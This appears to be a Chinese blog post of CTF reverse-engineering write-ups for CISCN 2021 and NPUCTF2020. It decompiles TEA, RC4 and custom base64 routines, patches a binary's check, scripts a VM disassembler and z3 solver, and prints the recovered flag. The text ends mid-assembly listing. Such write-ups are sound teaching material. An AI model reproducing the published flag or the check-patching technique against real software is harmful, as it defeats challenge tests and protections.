比赛的时候想直接动调跳过这些运算的，结果看到和input还有关系，这就不好办了，尝试手动看一下这是什么运算，但也没啥想法\n结果，晚上再看这道题的时候发现竟然看懂这个离谱运算了，啊啊啊啊啊好气啊\n虽然有一堆函数，观察发现，通常每一个for循环中，包裹了两个while循环，但比赛的时候一直以for循环为单位在想代码的含义，晚上再看的时候才发现，每一个while循环才是一个单位函数\nv1155 = ll; v1154 = 1i64; v1153 = ll \u0026amp; 1; v1152 = ll ^ 1; while ( v1153 ) { v1151 = v1152; v1150 = 2 * v1153; v1153 = (2 * v1153) \u0026amp; v1152; v1152 ^= v1150; } ll = v1152; v1041 = v1043; v1040 = v1045; v1039 = v1045 \u0026amp; v1043; v1038 = v1045 ^ v1043; // 运算简化方法：^ 换成 +，然后只保留这一行和最后一行 while ( v1039 ) { v1037 = v1038; v1036 = 2 * v1039; v1039 = (2 * v1039) \u0026amp; v1038; v1038 ^= v1036; } v1043 = v1038; 简单地说，上面这段代码，最终的执行效果就是，ll = ll + 1，推广到下半部分，就是 v1043 = v1038 = v1043 + v1045\n好了，到此，就可以完成简化了，之后就变成了一个for循环里面一条自增的语句，所以就转换成了乘法\n手动将这些代码整理好看一点，就长下面这样了\nfor ( ii = 0; ii \u0026lt; 4; ++i) { v1043 = ii * 8; v1169 = \u0026amp;list_a_v19[4 * ii]; input_1 = input + v1043; input_2 = input + v1043 + 4; sum = 0; delta = 3 * 884811923; key0 = v1169[0]; key1 = v1169[1]; key2 = v1169[2]; key3 = v1169[3]; for ( mm = 0; mm \u0026lt;= 0x1F; mm++ ) { sum = delta + sum; v1135 = 16 * input_2; v1118 = key0 + v1135; v1112 = sum + input_2; v1109 = input_2 \u0026gt;\u0026gt; 5; v1106 = key1 + v1109; input_1 += v1102; v1095 = 16 * v1100; v1078 = key2 + v1095; v1072 = sum + input_1; v1069 = input_1 \u0026gt;\u0026gt; 5; v1066 = key3 + v1069; input_2 += v1062; } v1170[0] = input_1; v1170[1] = input_2; } 经过了一些手动处理，得到了上面的伪代码，显然就是TEA呗，第一关就这么过了\nv510 = \u0026#34;Th1nkMyfr1end\u0026#34;; v507 = 0; char v18[256] = {}; v504 = 0; for ( i5 = 0; i5 \u0026lt; 256; i5++ ) { v17[i5] = i5; v18[i5] = v510[i5 % 13]; } for ( i5 = 0; i5 \u0026lt; 256; i5++ ) { v1 = v18[i5]; v2 = v17[i5]; v380 = v2 + v507; v371 = v1 + v380; v507 = v371 % 256; v504 = v17[i5]; v17[i5] = v17[v507]; v17[v507] = v504; } v511 = 32; v507 = 0; i5 = 0; for ( i17 = 0; v511 \u0026gt; i17; i17++ ) { i5 = (i5 + 1) % 256; // i = i + 1  v3 = v17[i5]; // S[i]  v507 = (v3 + v507) % 256; // j = (j + S[i]) % 256  v155 = v17[i5]; v17[i5] = v17[v507]; v17[v507] = v155; // S[i], S[j] = S[j], S[i]  v103 = v17[v507] + v17[i5]; // S[i] + S[j]  input[i17] ^= v17[v103 % 256]; // data ^= S[(S[i] + S[j]) % 256]  } 256的SBOX，且仅进行一次异或，果断RC4\n中间见到了这样的东西\nv100 = v103 v98 = v103 / v120; v97 = v120; v96 = v97 * v98; // 去除for循环后  v506 = v100 - v96; $v103 - (v120 * (v103 / v120)) = v103 - (v103 - (v103 % v120))$，显然就是取模运算了\n随后是这个\nv1013 = (__int64)input; v1012 = (__int64)v20; v1011 = strlen(input); for ( i31 = 0; i31 \u0026lt; 65; ++i31 ) { v978 = 3 * 823 * 5; // 12345  v948 = i31 * 0x114514; v18[i31] = v948 % v978; } while ( v1011 \u0026gt; 2 ) { v6 = *(_BYTE *)v1013 \u0026gt;\u0026gt; 2; *(_BYTE *)v1012 = v18[v6 \u0026amp; 0x3f]; v1012 += 1; *(_BYTE *)v1012 = v18[(16 * (v1013[0] \u0026amp; 3)) | (v1013[1] \u0026gt;\u0026gt; 4) \u0026amp; 0x0f]; v1012 += 1; v818 = 4 * (v1013[1] \u0026amp; 0x0f); v10 = *(_BYTE *)(v1013 + 2) \u0026gt;\u0026gt; 6; v804 = 2; v803 = 1; v802 = 0; v801 = 3; *(_BYTE *)v1012 = v18[v818 | v10 \u0026amp; 3]; v1012 += 1; v11 = v1013[2]; v5 = (unsigned __int8)v18[v11 \u0026amp; 0x63]; *(_BYTE *)v1012 = v5; v1012 += 1; v1011 = ~(~v1011 + 3); // v1011 -= 3  v1013 += 3; } if ( v1011 ) { v12 = *(_BYTE *)v1013 \u0026gt;\u0026gt; 2; *(_BYTE *)v1012 = v18[v12 \u0026amp; 0x3f]; v1012++; if ( v1011 \u0026lt;= 1 ) { v16 = *(_BYTE *)v1013; v640 = (v16 \u0026amp; 3) \u0026lt;\u0026lt; 4; *(_BYTE *)v1012 = v18[v640]; v1012++; v586 = 64; *(_BYTE *)v1012 = v18[v586]; v1012++; } else { v13 = *(_BYTE *)v1013; v720 = (v13 \u0026amp; 3) \u0026lt;\u0026lt; 4; v14 = *(_BYTE *)(v1013 + 1) \u0026gt;\u0026gt; 4; *(_BYTE *)v1012 = v18[v720 | v14 \u0026amp; 0xf]; v1012++; v15 = *(unsigned __int8 *)(v1013 + 1); v666 = (v15 \u0026amp; 0xf) \u0026lt;\u0026lt; 2; *(_BYTE *)v1012 = v18[v666]; v1012++; } v564 = 8; v548 = 8; v534 = v548; v533 = v564; v532 = 64; *(_BYTE *)v1012 = (unsigned __int8)v18[v532]; v1012++; } 第一个for循环是v18的生成，后面是个base64换表换成v18的\n根据字符串提示，后面就是check了，但这部分好像反编译不出来\n看了下汇编（patch前的忘记存了）\n07FF7D3CE9906 lea rcx, aWowThatIsAmazi ; \u0026quot;Wow.....That is amazing.......You actua\u0026quot;... .text:00007FF7D3CE990D call print .text:00007FF7D3CE9912 mov [rbp+2A80h+var_14], 0 .text:00007FF7D3CE991C jmp loc_7FF7D3CE9A16 .text:00007FF7D3CE9A16 loc_7FF7D3CE9A16: ; CODE XREF: sub_7FF7D3CE15E2+833A↑j .text:00007FF7D3CE9A16 nop .text:00007FF7D3CE9A17 nop .text:00007FF7D3CE9A18 nop .text:00007FF7D3CE9A19 nop .text:00007FF7D3CE9A1A nop .text:00007FF7D3CE9A1B nop .text:00007FF7D3CE9A1C nop .text:00007FF7D3CE9A1D nop .text:00007FF7D3CE9A1E nop .text:00007FF7D3CE9A1F nop .text:00007FF7D3CE9A20 nop .text:00007FF7D3CE9A21 nop .text:00007FF7D3CE9A22 nop .text:00007FF7D3CE9A23 nop .text:00007FF7D3CE9A24 nop .text:00007FF7D3CE9A25 nop .text:00007FF7D3CE9A26 lea rcx, aOkYouWinTheRes ; \u0026quot;Ok you win. The result will be shown la\u0026quot;... .text:00007FF7D3CE9A2D call print .text:00007FF7D3CE9A32 mov [rbp+2A80h+var_18], 0 .text:00007FF7D3CE9A3C jmp loc_7FF7D3CE9B1A 本来有一个判断和一个跳转，直接patch掉，中间应该是一些浪费时间的东西，再重新反编译一下，就能看到check部分了\nv1272 = 0; while ( 1 ) { v37 = 49; if ( v1272 \u0026gt;= v37 ) break; if ( *((_BYTE *)v21 + v1272) != *((_BYTE *)off_7FF7D3D02010 + v1272) ) { print((__int64)\u0026#34;No\\n\u0026#34;); return; } /* 从内存中取出的数据 unsigned char off_7FF7D3D02010[] = { 0x06, 0xAB, 0x05, 0x6A, 0xA0, 0x72, 0x71, 0x0D, 0x0A, 0x6F, 0xAC, 0x15, 0x05, 0xA5, 0x76, 0x41, 0x0A, 0x77, 0x13, 0xD8, 0x69, 0x03, 0x14, 0x78, 0xD5, 0xA8, 0x44, 0x0F, 0xA7, 0x76, 0x05, 0xAA, 0xA4, 0x09, 0x69, 0xA7, 0x0B, 0x11, 0x15, 0x42, 0x11, 0x72, 0x14, 0xAD, 0x00, 0x00, 0x00, 0x00 }; */ v1272 += 1; } 至此全部分析完毕，依次进行了TEA，RC4和Base64，中间进行了密钥生成，最后做个反向进行解密即可。\n补充：静态分析while语句实现的加法运算 之前的分析其实是用python实现一遍，然后找规律得到的（毕竟为了速度），但还是应该稍微静态分析一下具体发生了什么事情\n看的时候就感觉很像是数电中的加法器，还是用简单的例子分析一下（删去了没有用到的语句）\nv1153 = ll \u0026amp; 1; // 判断结尾是否为1 v1152 = ll ^ 1; // 如果结尾是1，将其变为0  // 如果结尾是0，将其变为1 while ( v1153 ) { // 如果此前结尾为1，将会涉及到进位的问题，因此进入循环  // 如果此前结尾为0，就没有进位的问题了，无需进入循环  v1150 = 2 * v1153; // 将结尾左移1  v1153 = (2 * v1153) \u0026amp; v1152; // 与加法之后的结果再进行一次按位与，这个的目的是看接下来是否还需要进位  v1152 ^= v1150; // 进行无进位加法 } // 什么时候不会产生进位的问题了，什么时候就可以退出循环了 ll = v1152; 简单的说，就是用异或运算作为无进位的加法，然后通过一个while循环来完成进位\nvs 这道题就比赛的时候简单看了一下，逆向难度很低，从一个文件读取指令，另一个文件当作内存，vm指令其实不难，但文件中的指令很多，需要手写一个vm的分析代码。\n写完之后发现行数略多，先手动分析找了找规律，然后写了个自动化脚本提取，生成python代码，直接拿flag。\nvm的解析脚本 vmreader.py:\nmemory = [ 0x0C, 0xF4, 0x5F, 0xE9, 0xF2, 0xE6, 0x87, 0x4C, 0x5E, 0x61, 0x11, 0x7B, 0xF0, 0x11, 0x7F, 0xB4, 0xB2, 0xEB, 0x65, 0xE2, 0x15, 0xC6, 0x8B, 0x02, 0x8C, 0xC1, 0x50, 0xD0, 0x0D, 0xA1, 0xCD, 0x3A ] cnt = 0 class OPCode: def __init__(self, code_len, code, arglen, pes_code): self.code_len = code_len self.code = code self.arglen = arglen self.pes_code = pes_code class Reader: def __init__(self, file): self.index = 0 self.buf = open(file, \u0026#39;rb\u0026#39;).read() self.length = len(self.buf) self.asm = [] def add_asm(self, asm: OPCode): self.asm.append(asm) def read(self): global cnt while len(self.buf) \u0026gt; 0: for a in self.asm: if a.code(self.buf[:a.code_len]): # self.output += a.pes_code op_code = self.buf[:a.code_len] self.buf = self.buf[a.code_len:] if op_code == b\u0026#39;\\xff\\xff\u0026#39; and self.buf[1] \u0026gt; 2: print (cnt, op_code) cnt += 1 break args = [_ for _ in self.buf[:a.arglen]] a.pes_code(op_code, args) self.buf = self.buf[a.arglen:] break else: print (cnt, self.buf[0]) cnt += 1 self.buf = self.buf[1:] def basic_io_code(op_code): if op_code == b\u0026#39;\\xFF\\xFF\u0026#39;: return True return False def basic_io_op(op_code, args): global cnt if args[1] == 2: if args[0] \u0026gt; 0x20 and args[0] \u0026lt; 0x7f: print (\u0026#39;%dprint %c\u0026#39; % (cnt, args[0])) cnt += 2 else: print (\u0026#39;%dprint \\\\x%02x\u0026#39; % (cnt, args[0])) cnt += 2 elif args[1] == 1: print (\u0026#39;%dmem[%d] = \u0026lt;input\u0026gt;\u0026#39; % (cnt, args[0])) cnt += 2 elif args[1] == 0: print (\u0026#39;%dexit(0)\u0026#39; % cnt) cnt += 2 else: print (op_code, args) def jmp_code(op_code): if int.from_bytes(op_code, \u0026#39;little\u0026#39;) \u0026amp; 0x8000 == 0: return True return False def jmp_op(op_code, args): global cnt pc = int.from_bytes(op_code, \u0026#39;little\u0026#39;) addr = pc \u0026amp; 0x1FF if (addr \u0026gt;\u0026gt; 3) \u0026gt; 31: if (memory[(addr \u0026gt;\u0026gt; 3) - 32] \u0026gt;\u0026gt; (addr \u0026amp; 7)) \u0026amp; 1 == 0: print (f\u0026#39;{cnt}goto {cnt + ((pc \u0026gt;\u0026gt; 9) \u0026amp; 0x3f)}\u0026#39;) else: print (f\u0026#39;{cnt}nop\u0026#39;) else: print (\u0026#39;%dif ((mem[ %d] \u0026gt;\u0026gt; %d) \u0026amp; 1) == 0\u0026#39; % (cnt, addr \u0026gt;\u0026gt; 3, addr \u0026amp; 7), f\u0026#39;goto {cnt+((pc \u0026gt;\u0026gt; 9) \u0026amp; 0x3f)}\u0026#39;) cnt += 1 def jmp2_code(op_code): if int.from_bytes(op_code, \u0026#39;little\u0026#39;) \u0026amp; 0x8000 != 0 and op_code != b\u0026#39;\\xff\\xff\u0026#39;: return True return False def jmp2_op(op_code, args): global cnt pc = int.from_bytes(op_code, \u0026#39;little\u0026#39;) addr = pc \u0026amp; 0x1FF if (addr \u0026gt;\u0026gt; 3) \u0026gt; 31: if (memory[(addr \u0026gt;\u0026gt; 3) - 32] \u0026gt;\u0026gt; (addr \u0026amp; 7)) \u0026amp; 1 != 0: print (f\u0026#39;{cnt}goto {cnt + ((pc \u0026gt;\u0026gt; 9) \u0026amp; 0x3f)}\u0026#39;) else: print (f\u0026#39;{cnt}nop\u0026#39;) else: print (\u0026#39;%dif ((mem[ %d] \u0026gt;\u0026gt; %d) \u0026amp; 1) != 0\u0026#39; % (cnt, addr \u0026gt;\u0026gt; 3, addr \u0026amp; 7), f\u0026#39;goto {cnt+((pc \u0026gt;\u0026gt; 9) \u0026amp; 0x3f)}\u0026#39;) cnt += 1 basic_io = OPCode(2, basic_io_code, 2, basic_io_op) r = Reader(\u0026#39;program\u0026#39;) jmp = OPCode(2, jmp_code, 0, jmp_op) jmp2 = OPCode(2, jmp2_code, 0, jmp2_op) r.add_asm(basic_io) r.add_asm(jmp) r.add_asm(jmp2) r.read() 分析指令 0 print P 2 print l 4 print e 6 print a 8 print s 10 print e 12 print \\x20 14 print i 16 print n 18 print p 20 print u 22 print t 24 print \\x20 26 print y 28 print o 30 print u 32 print r 34 print \\x20 36 print f 38 print l 40 print a 42 print g 44 print : 46 print \\x20 48 mem[0] = \u0026lt;input\u0026gt; 50 mem[1] = \u0026lt;input\u0026gt; 52 mem[2] = \u0026lt;input\u0026gt; 54 mem[3] = \u0026lt;input\u0026gt; 56 mem[4] = \u0026lt;input\u0026gt; 58 mem[5] = \u0026lt;input\u0026gt; 60 mem[6] = \u0026lt;input\u0026gt; 62 mem[7] = \u0026lt;input\u0026gt; 64 mem[8] = \u0026lt;input\u0026gt; 66 mem[9] = \u0026lt;input\u0026gt; 68 mem[10] = \u0026lt;input\u0026gt; 70 mem[11] = \u0026lt;input\u0026gt; 72 mem[12] = \u0026lt;input\u0026gt; 74 mem[13] = \u0026lt;input\u0026gt; 76 mem[14] = \u0026lt;input\u0026gt; 78 mem[15] = \u0026lt;input\u0026gt; 80 mem[16] = \u0026lt;input\u0026gt; 82 mem[17] = \u0026lt;input\u0026gt; 84 mem[18] = \u0026lt;input\u0026gt; 86 mem[19] = \u0026lt;input\u0026gt; 88 mem[20] = \u0026lt;input\u0026gt; 90 mem[21] = \u0026lt;input\u0026gt; 92 mem[22] = \u0026lt;input\u0026gt; 94 mem[23] = \u0026lt;input\u0026gt; 96 mem[24] = \u0026lt;input\u0026gt; 98 mem[25] = \u0026lt;input\u0026gt; 100 mem[26] = \u0026lt;input\u0026gt; 102 mem[27] = \u0026lt;input\u0026gt; 104 mem[28] = \u0026lt;input\u0026gt; 106 mem[29] = \u0026lt;input\u0026gt; 108 mem[30] = \u0026lt;input\u0026gt; 110 mem[31] = \u0026lt;input\u0026gt; 这部分是简单的输出和输入，直接看二进制文件的字节也能看出来\n然后是输入的判断部分\n112 if ((mem[ 12 ] \u0026gt;\u0026gt; 5 ) \u0026amp; 1) != 0 goto 125 113 nop 114 if ((mem[ 19 ] \u0026gt;\u0026gt; 2 ) \u0026amp; 1) == 0 goto 125 115 print N 117 print o 119 print ! 121 print \\x0a 123 exit(0) 125 goto 127 126 if ((mem[ 22 ] \u0026gt;\u0026gt; 6 ) \u0026amp; 1) != 0 goto 146 127 goto 131 128 if ((mem[ 1 ] \u0026gt;\u0026gt; 1 ) \u0026amp; 1) != 0 goto 140 129 if ((mem[ 0 ] \u0026gt;\u0026gt; 3 ) \u0026amp; 1) != 0 goto 140 130 b'\\xff\\xff' 131 goto 133 132 b'\\xff\\xff' 133 if ((mem[ 30 ] \u0026gt;\u0026gt; 5 ) \u0026amp; 1) == 0 goto 146 134 nop 135 nop 136 print N 138 print o 140 print ! 142 print \\x0a 144 exit(0) 146 nop 147 if ((mem[ 6 ] \u0026gt;\u0026gt; 4 ) \u0026amp; 1) != 0 goto 169 148 goto 150 149 b'\\xff\\xff' 150 goto 154 151 if ((mem[ 0 ] \u0026gt;\u0026gt; 4 ) \u0026amp; 1) == 0 goto 163 152 if ((mem[ 3 ] \u0026gt;\u0026gt; 0 ) \u0026amp; 1) != 0 goto 163 153 b'\\xff\\xff' 154 if ((mem[ 8 ] \u0026gt;\u0026gt; 0 ) \u0026amp; 1) == 0 goto 169 155 goto 159 156 if ((mem[ 1 ] \u0026gt;\u0026gt; 0 ) \u0026amp; 1) == 0 goto 168 157 if ((mem[ 1 ] \u0026gt;\u0026gt; 7 ) \u0026amp; 1) != 0 goto 168 158 b'\\xff\\xff' 159 print N 161 print o 163 print ! 165 print \\x0a 167 exit(0) 169 if ((mem[ 4 ] \u0026gt;\u0026gt; 4 ) \u0026amp; 1) != 0 goto 190 170 goto 172 171 b'\\xff\\xff' 172 if ((mem[ 20 ] \u0026gt;\u0026gt; 0 ) \u0026amp; 1) == 0 goto 190 173 nop 174 b'\\xff\\xff' 175 if ((mem[ 2 ] \u0026gt;\u0026gt; 1 ) \u0026amp; 1) != 0 goto 179 ; 由于ffff后会直接跳过下一个，所以这一句也没有用 176 goto 180 177 if ((mem[ 1 ] \u0026gt;\u0026gt; 3 ) \u0026amp; 1) != 0 goto 189 178 if ((mem[ 3 ] \u0026gt;\u0026gt; 3 ) \u0026amp; 1) == 0 goto 189 179 b'\\xff\\xff' 180 print N 182 print o 184 print ! 186 print \\x0a 188 exit(0) 二进制文件中出现了很多奇奇怪怪的 \\xFF\\xFF，感觉起到了一部分的花指令作用，所以对于不满足的情况全部拆开处理了，但这又导致读取后的逻辑不是很清晰，需要进行简单的手动分析\n 程序中 if ((mem[ 1 ] \u0026gt;\u0026gt; 3 ) \u0026amp; 1) != 0 之间空格实际上是为了后续进一步读取准备的\n 分析时可以看出，flag的判断逻辑显然是对输入的每一比特加了限定，目的就是跳过所有的退出\n对这一部分手动分析，删掉没有用的部分\n112 if ((mem[ 12 ] \u0026gt;\u0026gt; 5 ) \u0026amp; 1) != 0 goto 125 114 if ((mem[ 19 ] \u0026gt;\u0026gt; 2 ) \u0026amp; 1) == 0 goto 125 115 print No! 123 exit(0) 125 goto 127 126 if ((mem[ 22 ] \u0026gt;\u0026gt; 6 ) \u0026amp; 1) != 0 goto 146 ; 这句话也没有用，但自动提取时不容易处理，仍然保留 127 goto 131 131 goto 133 133 if ((mem[ 30 ] \u0026gt;\u0026gt; 5 ) \u0026amp; 1) == 0 goto 146 136 print No! 144 exit(0) 146 nop 147 if ((mem[ 6 ] \u0026gt;\u0026gt; 4 ) \u0026amp; 1) != 0 goto 169 148 goto 150 150 goto 154 154 if ((mem[ 8 ] \u0026gt;\u0026gt; 0 ) \u0026amp; 1) == 0 goto 169 155 goto 159 159 print No! 167 exit(0) 169 if ((mem[ 4 ] \u0026gt;\u0026gt; 4 ) \u0026amp; 1) != 0 goto 190 170 goto 172 172 if ((mem[ 20 ] \u0026gt;\u0026gt; 0 ) \u0026amp; 1) == 0 goto 190 173 nop 176 goto 180 180 print No! 188 exit(0) 可以看到，可用的跳转一定是跳转到exit后面的，这样就可以实现一个自动化脚本了\nextract.py\ninfile = open(\u0026#39;1.txt\u0026#39;) code = infile.read() code = code.split(\u0026#39;\\n\u0026#39;) target = [] for line in code: if \u0026#39;exit\u0026#39; in line: target.append(str(int(line.split(\u0026#39; \u0026#39;)[0]) + 2)) # print (target) for line in code: tmp = line.split(\u0026#39; \u0026#39;) if tmp[-1] in target: print (line) 最后再自动生成一个z3脚本\ndef fmt(in_list): ret = \u0026#39;\u0026#39; if in_list[2] == \u0026#39;==\u0026#39;: ret += \u0026#39;eq(\u0026#39; elif in_list[2] == \u0026#39;!=\u0026#39;: ret += \u0026#39;neq(\u0026#39; ret += in_list[0] + \u0026#39;, \u0026#39; + in_list[1] ret += \u0026#39;)\u0026#39; return ret infile = open(\u0026#39;2.txt\u0026#39;) print (\u0026#39;\u0026#39;\u0026#39;from z3 import * s = Solver() flag = [BitVec(\u0026#39;flag%d\u0026#39; % i, 8) for i in range(32)] for f in flag: s.add(f \u0026gt; 0x20) s.add(f \u0026lt; 0x7f) def eq(pos_f, pos_b): return flag[pos_f] \u0026amp; (1 \u0026lt;\u0026lt; pos_b) == 0 def neq(pos_f, pos_b): return flag[pos_f] \u0026amp; (1 \u0026lt;\u0026lt; pos_b) != 0 \u0026#39;\u0026#39;\u0026#39;) lines = infile.read() lines = lines.split(\u0026#39;\\n\u0026#39;) for i in range(0, len(lines) - 1, 2): a, b = lines[i], lines[i + 1] a = a.split(\u0026#39; \u0026#39;) b = b.split(\u0026#39; \u0026#39;) a = [a[3], a[6], a[-4]] b = [b[3], b[6], b[-4]] print (\u0026#39;s.add(Or(\u0026#39; + fmt(a) + \u0026#39;, \u0026#39; + fmt(b) + \u0026#39;))\u0026#39;) print (\u0026#39;\u0026#39;\u0026#39; if s.check() == sat: model = s.model() for f in flag: print (chr(model[f].as_long().real), end = \u0026#39;\u0026#39;) print (\u0026#39;\\\\nfinish\u0026#39;)\u0026#39;\u0026#39;\u0026#39;) 运行之后就可以得到flag了\n# python3 vmreader.py \u0026gt; 1.txt # python3 extract.py \u0026gt; 2.txt # python3 to_py.py \u0026gt; 3.py # python3 3.py flag{_2_SAT_15_a_P_pr0b13M_4F6v} finish # ./vs Please input your flag: flag{_2_SAT_15_a_P_pr0b13M_4F6v} Congratulation! 通过程序验证\n总结 还是第一次在一个逆向题目中写这么多代码，最近又看到一些需要写代码的题目，还是需要提高开发能力啊\n","date":"2021-06-22T23:25:43Z","permalink":"/post/ciscn-n-2021-re-writeup/","title":"CISCN-N 2021 RE Writeup"},{"content":"[NPUCTF2020]BasicASM 纯考察汇编的题目，有考虑想办法改成正确的汇编形式然后编译用ida看，但感觉就失去意义了，于是硬啃汇编\n00007FF7A8AC5A50 push rbp 00007FF7A8AC5A52 push rdi 00007FF7A8AC5A53 sub rsp,238h 00007FF7A8AC5A5A lea rbp,[rsp+20h] 00007FF7A8AC5A5F mov rdi,rsp 00007FF7A8AC5A62 mov ecx,8Eh 00007FF7A8AC5A67 mov eax,0CCCCCCCCh 00007FF7A8AC5A6C rep stos dword ptr [rdi] 00007FF7A8AC5A6E mov rax,qword ptr [__security_cookie (07FF7A8AD3018h)] 00007FF7A8AC5A75 xor rax,rbp 00007FF7A8AC5A78 mov qword ptr [rbp+208h],rax 00007FF7A8AC5A7F lea rcx,[__06A15900_ConsoleApplication@cpp (07FF7A8AD902Ah)] 00007FF7A8AC5A86 call __CheckForDebuggerJustMyCode (07FF7A8AC1122h) 00007FF7A8AC5A8B lea rdx,[string \u0026quot;flag{this_is_a_fake_flag}\u0026quot; (07FF7A8ACF450h)] 00007FF7A8AC5A92 lea rcx,[flag] 00007FF7A8AC5A96 call std::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt; \u0026gt;::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt; \u0026gt; (07FF7A8AC15E1h) 00007FF7A8AC5A9B nop 00007FF7A8AC5A9C mov dword ptr [p],0 00007FF7A8AC5AA3 mov i,0 00007FF7A8AC5AAA jmp main+64h (07FF7A8AC5AB4h) 00007FF7A8AC5AAC mov eax,i 00007FF7A8AC5AAF inc eax 00007FF7A8AC5AB1 mov i,eax 00007FF7A8AC5AB4 movsxd rax,i 00007FF7A8AC5AB8 mov qword ptr [rbp+1F8h],rax 00007FF7A8AC5ABF lea rcx,[flag] 00007FF7A8AC5AC3 call std::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt; \u0026gt;::length (07FF7A8AC122Bh) 00007FF7A8AC5AC8 mov rcx,qword ptr [rbp+1F8h] 00007FF7A8AC5ACF cmp rcx,rax 00007FF7A8AC5AD2 jae main+1B2h (07FF7A8AC5C02h) ; 无符号数比较，大于或等于时跳转 00007FF7A8AC5AD8 mov eax,i 00007FF7A8AC5ADB and eax,1 ; 取最后1位 00007FF7A8AC5ADE cmp eax,1 ; 判断奇偶 00007FF7A8AC5AE1 jne main+126h (07FF7A8AC5B76h) ; 偶数跳转（不相等跳转） 00007FF7A8AC5AE7 movsxd rax,i 00007FF7A8AC5AEB mov rdx,rax 00007FF7A8AC5AEE lea rcx,[flag] 00007FF7A8AC5AF2 call std::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt; \u0026gt;::operator[] (07FF7A8AC1442h) 00007FF7A8AC5AF7 movsx eax,byte ptr [rax] ; 取flag第i位 00007FF7A8AC5AFA xor eax,42h ; 与0x42异或 00007FF7A8AC5AFD mov dword ptr [p],eax ; 异或结果移到内存中 00007FF7A8AC5B00 mov dl,30h 00007FF7A8AC5B02 lea rcx,[rbp+144h] 00007FF7A8AC5B09 call std::setfill\u0026lt;char\u0026gt; (07FF7A8AC1046h) ; 用字符'0'进行填充 00007FF7A8AC5B0E mov qword ptr [rbp+1F8h],rax 00007FF7A8AC5B15 mov edx,2 00007FF7A8AC5B1A lea rcx,[rbp+168h] 00007FF7A8AC5B21 call std::setw (07FF7A8AC10D2h) ; 填充至2位 00007FF7A8AC5B26 mov qword ptr [rbp+200h],rax 00007FF7A8AC5B2D lea rdx,[std::hex (07FF7A8AC1488h)] ; 以十六进制形式输出 00007FF7A8AC5B34 mov rcx,qword ptr [__imp_std::cout (07FF7A8AD71C0h)] 00007FF7A8AC5B3B call qword ptr [__imp_std::basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt; \u0026gt;::operator\u0026lt;\u0026lt; (07FF7A8AD7160h)] 00007FF7A8AC5B41 mov rcx,qword ptr [rbp+200h] 00007FF7A8AC5B48 mov rdx,rcx 00007FF7A8AC5B4B mov rcx,rax 00007FF7A8AC5B4E call std::operator\u0026lt;\u0026lt;\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,__int64\u0026gt; (07FF7A8AC12F8h) 00007FF7A8AC5B53 mov rcx,qword ptr [rbp+1F8h] 00007FF7A8AC5B5A mov rdx,rcx 00007FF7A8AC5B5D mov rcx,rax 00007FF7A8AC5B60 call std::operator\u0026lt;\u0026lt;\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,char\u0026gt; (07FF7A8AC11A4h) 00007FF7A8AC5B65 mov edx,dword ptr [p] 00007FF7A8AC5B68 mov rcx,rax 00007FF7A8AC5B6B call qword ptr [__imp_std::basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt; \u0026gt;::operator\u0026lt;\u0026lt; (07FF7A8AD7158h)] 00007FF7A8AC5B71 jmp main+1ADh (07FF7A8AC5BFDh) 00007FF7A8AC5B76 movsxd rax,i ; 偶数时跳转到这里，与奇数唯一的区别为没有异或运算 00007FF7A8AC5B7A mov rdx,rax 00007FF7A8AC5B7D lea rcx,[flag] 00007FF7A8AC5B81 call std::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt; \u0026gt;::operator[] (07FF7A8AC1442h) 00007FF7A8AC5B86 movsx eax,byte ptr [rax] 00007FF7A8AC5B89 mov dword ptr [p],eax 00007FF7A8AC5B8C mov dl,30h 00007FF7A8AC5B8E lea rcx,[rbp+194h] 00007FF7A8AC5B95 call std::setfill\u0026lt;char\u0026gt; (07FF7A8AC1046h) 00007FF7A8AC5B9A mov qword ptr [rbp+1F8h],rax 00007FF7A8AC5BA1 mov edx,2 00007FF7A8AC5BA6 lea rcx,[rbp+1B8h] 00007FF7A8AC5BAD call std::setw (07FF7A8AC10D2h) 00007FF7A8AC5BB2 mov qword ptr [rbp+200h],rax 00007FF7A8AC5BB9 lea rdx,[std::hex (07FF7A8AC1488h)] 00007FF7A8AC5BC0 mov rcx,qword ptr [__imp_std::cout (07FF7A8AD71C0h)] 00007FF7A8AC5BC7 call qword ptr [__imp_std::basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt; \u0026gt;::operator\u0026lt;\u0026lt; (07FF7A8AD7160h)] 00007FF7A8AC5BCD mov rcx,qword ptr [rbp+200h] 00007FF7A8AC5BD4 mov rdx,rcx 00007FF7A8AC5BD7 mov rcx,rax 00007FF7A8AC5BDA call std::operator\u0026lt;\u0026lt;\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,__int64\u0026gt; (07FF7A8AC12F8h) 00007FF7A8AC5BDF mov rcx,qword ptr [rbp+1F8h] 00007FF7A8AC5BE6 mov rdx,rcx 00007FF7A8AC5BE9 mov rcx,rax 00007FF7A8AC5BEC call std::operator\u0026lt;\u0026lt;\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,char\u0026gt; (07FF7A8AC11A4h) 00007FF7A8AC5BF1 mov edx,dword ptr [p] 00007FF7A8AC5BF4 mov rcx,rax 00007FF7A8AC5BF7 call qword ptr [__imp_std::basic_ostream\u0026lt;char,std::char_traits\u0026lt;char\u0026gt; \u0026gt;::operator\u0026lt;\u0026lt; (07FF7A8AD7158h)] 00007FF7A8AC5BFD jmp main+5Ch (07FF7A8AC5AACh) 00007FF7A8AC5C02 mov dword ptr [rbp+1E4h],0 00007FF7A8AC5C0C lea rcx,[flag] 00007FF7A8AC5C10 call std::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt; \u0026gt;::~basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt; \u0026gt; (07FF7A8AC1302h) 00007FF7A8AC5C15 mov eax,dword ptr [rbp+1E4h] 00007FF7A8AC5C1B mov edi,eax 00007FF7A8AC5C1D lea 